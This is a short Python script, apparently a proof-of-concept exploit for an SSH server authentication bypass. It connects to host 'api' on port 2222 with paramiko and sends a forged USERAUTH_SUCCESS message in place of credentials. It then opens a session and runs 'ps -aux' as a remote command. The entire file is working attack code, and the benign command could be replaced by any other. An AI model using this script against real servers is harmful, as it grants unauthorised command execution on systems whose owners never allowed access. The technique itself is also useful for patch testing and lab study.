import paramiko
import socket

hostname = "api"
port = 2222

sock = socket.socket()
sock.connect((hostname, port))

message = paramiko.message.Message()
transport = paramiko.transport.Transport(sock)
transport.start_client()

message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
transport._send_message(message)

cmd = transport.open_session()
cmd.exec_command("ps -aux")
print(cmd.recv(4096).decode())
